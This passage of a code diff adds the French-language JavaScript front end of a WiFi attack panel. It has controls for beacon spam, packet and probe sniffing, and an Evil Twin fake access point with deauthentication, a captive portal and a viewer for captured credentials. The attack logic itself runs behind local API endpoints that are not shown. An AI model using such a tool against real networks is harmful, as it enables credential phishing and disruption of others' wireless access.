+  const ch    = +document.getElementById('beacon-ch').value;
+  const count = +document.getElementById('beacon-count').value;
+  if (mode === 'clone' && !ssid) { alert('SSID requis pour le mode clone'); return; }
+
+  termClear('beacon-terminal');
+  termLog('beacon-terminal', `[>] Beacon spam mode=${mode} ch=${ch} n=${count}`, 'info');
+
+  fetch('/api/beacon/spam', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mode, ssid, channel:ch, count})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) termLog('beacon-terminal', '[+] Terminé : ' + d.out, 'ok');
+    else      termLog('beacon-terminal', '[x] ' + d.error, 'err');
+  }).catch(e => termLog('beacon-terminal', '[x] ' + e, 'err'));
+}
+
+// ── Sniffer ────────────────────────────────────────────────────────────────
+function runSniff() {
+  const dur = document.getElementById('sniff-dur').value;
+  const ch  = document.getElementById('sniff-ch').value;
+  termClear('sniff-terminal');
+  termLog('sniff-terminal', `[>] Capture ${dur}s${ch ? ' canal '+ch : ' hopping'}...`, 'info');
+  const url = '/api/stream/sniff?duration=' + dur + (ch ? '&channel='+ch : '');
+  const es  = new EventSource(url);
+  es.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg === '__END__') { es.close(); termLog('sniff-terminal', '[+] Capture terminée', 'ok'); return; }
+    termLog('sniff-terminal', msg, msg.includes('[+]')?'ok':msg.includes('[x]')?'err':'');
+  };
+}
+
+function runProbe() {
+  const dur = document.getElementById('probe-dur').value;
+  termClear('probe-terminal');
+  termLog('probe-terminal', `[>] Probe sniffer ${dur}s...`, 'info');
+  const es = new EventSource('/api/stream/probe?duration=' + dur);
+  es.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg === '__END__') { es.close(); termLog('probe-terminal', '[+] Terminé', 'ok'); return; }
+    termLog('probe-terminal', msg, msg.includes('[+]')?'ok':msg.includes('[x]')?'err':'');
+  };
+}
+
+// ── Evil Twin ──────────────────────────────────────────────────────────────
+let _etPollInterval = null;
+
+function _etSetRunning(running) {
+  document.getElementById('et-start-btn').disabled = running;
+  document.getElementById('et-stop-btn').disabled  = !running;
+  const badge = document.getElementById('et-status-badge');
+  badge.className = running ? 'badge bg-success' : 'badge bg-secondary';
+  badge.textContent = running ? 'EN COURS' : 'Inactif';
+}
+
+function _etPoll() {
+  fetch('/api/eviltwin/status').then(r => r.json()).then(d => {
+    _etSetRunning(d.running);
+    if (!d.running && _etPollInterval) {
+      clearInterval(_etPollInterval);
+      _etPollInterval = null;
+      termLog('et-terminal', '[!] Evil Twin arrêté', 'info');
+    }
+  });
+}
+
+function startEvilTwin() {
+  const ssid  = document.getElementById('et-ssid').value.trim();
+  const ch    = +document.getElementById('et-ch').value;
+  const bssid = document.getElementById('et-bssid').value.trim();
+  if (!ssid) { alert('SSID requis'); return; }
+  termClear('et-terminal');
+  termLog('et-terminal', `[>] Démarrage Evil Twin "${ssid}" ch${ch}${bssid?' + deauth':''}...`, 'info');
+  fetch('/api/eviltwin/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ssid, channel:ch, deauth_bssid:bssid})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      termLog('et-terminal', `[+] AP "${ssid}" actif — portail captif sur 192.168.4.1`, 'ok');
+      termLog('et-terminal', '[*] En attente de connexions...', 'info');
+      _etSetRunning(true);
+      _etPollInterval = setInterval(_etPoll, 3000);
+    } else {
+      termLog('et-terminal', '[x] ' + (d.error || d.status), 'err');
+    }
+  }).catch(e => termLog('et-terminal', '[x] ' + e, 'err'));
+}
+
+function stopEvilTwin() {
+  fetch('/api/eviltwin/stop', {method:'POST'}).then(r => r.json()).then(d => {
+    _etSetRunning(false);
+    if (_etPollInterval) { clearInterval(_etPollInterval); _etPollInterval = null; }
+    termLog('et-terminal', '[+] Evil Twin stoppé', 'ok');
+  });
+}
+
+function getCaptures() {
+  termClear('et-terminal');
+  termLog('et-terminal', '[>] Lecture des identifiants capturés...', 'info');
+  fetch('/api/eviltwin/captures').then(r => r.json()).then(d => {
+    const lines = d.out ? d.out.split('\n') : ['Aucun identifiant capturé'];
+    lines.forEach(l => termLog('et-terminal', l, l.includes('|') ? 'ok' : ''));
+  });
+}
+
+// ── Utilitaire ─────────────────────────────────────────────────────────────
+function esc(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+</script>
+</body>
+</html>
